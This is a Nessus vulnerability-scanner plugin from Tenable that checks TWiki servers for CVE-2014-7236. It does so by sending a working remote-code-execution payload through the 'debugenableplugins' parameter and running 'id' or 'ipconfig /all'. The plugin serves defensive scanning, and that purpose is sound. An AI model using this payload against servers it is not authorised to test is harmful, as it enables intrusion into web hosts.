#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(82898);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/01/19 15:00:09 $");

  script_cve_id("CVE-2014-7236");
  script_bugtraq_id(70372);
  script_osvdb_id(112977);

  script_name(english:"TWiki 'debugenableplugins' Parameter RCE");
  script_summary(english:"Attempts to run a command using TWiki.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI script that is affected by a remote
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of TWiki installed on the remote host is affected by a
remote code execution vulnerability due to a failure to properly
sanitize user-supplied input to the 'debugenableplugins' parameter
upon submission to the 'view' script. A remote, unauthenticated 
attacker can exploit this issue to execute arbitrary Perl code subject
to the privileges of the web server user id.

Note that the application is reportedly also affected by a file upload
vulnerability when installed on Windows hosts; however, Nessus has not
tested for this issue.");
  script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/TWikiRelease06x00x01");
  script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TWiki version 6.0.1 or later. Alternatively, apply the
hotfix referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"TWiki debugenableplugins RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'TWiki Debugenableplugins Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/10/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/04/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:twiki:twiki");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("twiki_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/TWiki");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "TWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

if ("cgi-bin" >!< dir)
{
  dir = ereg_replace(pattern:"(/[^/]+/).*", string:dir, replace:"\1");
  dir = dir + "bin/";
}
else
  dir = dir - "view";

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask|IP(v(4|6)?)? Address";

foreach cmd (cmds)
{

  url = "view/Main/WebHome?debugenableplugins=BackupRestorePlugin%3bprint"+
   '("Content-Type:text/html\\r\\n\\r\\n")%3bsystem('+"'"+cmd+"')%3bexit";

  res = http_send_recv3(
    method       : "GET",
    item         : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : 2,
  request     : make_list(build_url(qs:dir+url, port:port)),
  output      : chomp(res[2])
);
exit(0);
